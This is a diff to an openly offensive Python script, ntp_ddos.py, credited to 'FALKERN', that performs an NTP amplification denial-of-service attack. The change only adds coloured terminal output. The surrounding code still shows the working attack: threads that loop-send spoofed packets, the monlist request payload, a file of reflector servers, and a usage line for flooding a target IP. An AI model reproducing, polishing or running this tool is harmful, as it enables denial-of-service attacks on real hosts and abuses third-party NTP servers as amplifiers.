@@ -5,6 +5,16 @@ import threading
 import time
 import random
 
+# ANSI escape sequences for colors
+class Colors:
+    RESET = "\033[0m"
+    RED = "\033[31m"
+    GREEN = "\033[32m"
+    YELLOW = "\033[33m"
+    BLUE = "\033[34m"
+    MAGENTA = "\033[35m"
+    CYAN = "\033[36m"
+
 def deny():
     global ntplist
     global currentserver
@@ -16,12 +26,12 @@ def deny():
     send(packet, loop=1)
 
 def printhelp():
-    print("NTP Amplification DOS Attack")
-    print("By FALKERN")
-    print("Usage: ntp_ddos.py <target ip> <ntpserver list> <number of threads>")
-    print("ex: ntp_ddos.py 1.2.3.4 ntp.txt 10")
-    print("NTP serverlist file should contain one IP per line")
-    print("MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS")
+    print(f"{Colors.CYAN}NTP Amplification DOS Attack{Colors.RESET}")
+    print(f"{Colors.YELLOW}By FALKERN{Colors.RESET}")
+    print(f"{Colors.GREEN}Usage: ntp_ddos.py <target ip> <ntpserver list> <number of threads>{Colors.RESET}")
+    print(f"{Colors.GREEN}ex: ntp_ddos.py 1.2.3.4 ntp.txt 10{Colors.RESET}")
+    print(f"{Colors.GREEN}NTP server list file should contain one IP per line{Colors.RESET}")
+    print(f"{Colors.RED}MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS{Colors.RESET}")
     exit(0)
 
 try:
@@ -37,20 +47,20 @@ try:
     with open(ntpserverfile) as f:
         ntplist = f.readlines()
     if numberthreads > len(ntplist):
-        print("Attack Aborted: More threads than servers")
-        print("Next time don't create more threads than servers")
+        print(f"{Colors.RED}Attack Aborted: More threads than servers{Colors.RESET}")
+        print(f"{Colors.RED}Next time don't create more threads than servers{Colors.RESET}")
         exit(0)
     data = "\x17\x00\x03\x2a" + "\x00" * 4
     threads = []
-    print("Starting to flood: " + target + " using NTP list: " + ntpserverfile + " with " + str(numberthreads) + " threads")
-    print("Use CTRL+C to stop attack")
+    print(f"{Colors.GREEN}Starting to flood: {Colors.MAGENTA}{target}{Colors.GREEN} using NTP list: {Colors.MAGENTA}{ntpserverfile}{Colors.GREEN} with {Colors.MAGENTA}{numberthreads} threads{Colors.RESET}")
+    print(f"{Colors.YELLOW}Use CTRL+C to stop attack{Colors.RESET}")
     for n in range(numberthreads):
         thread = threading.Thread(target=deny)
         thread.daemon = True
         thread.start()
         threads.append(thread)
-    print("Sending...")
+    print(f"{Colors.GREEN}Sending...{Colors.RESET}")
     while True:
         time.sleep(1)
 except KeyboardInterrupt:
-    print("Script Stopped [ctrl + c]... Shutting down")
+    print(f"{Colors.RED}Script Stopped [ctrl + c]... Shutting down{Colors.RESET}")
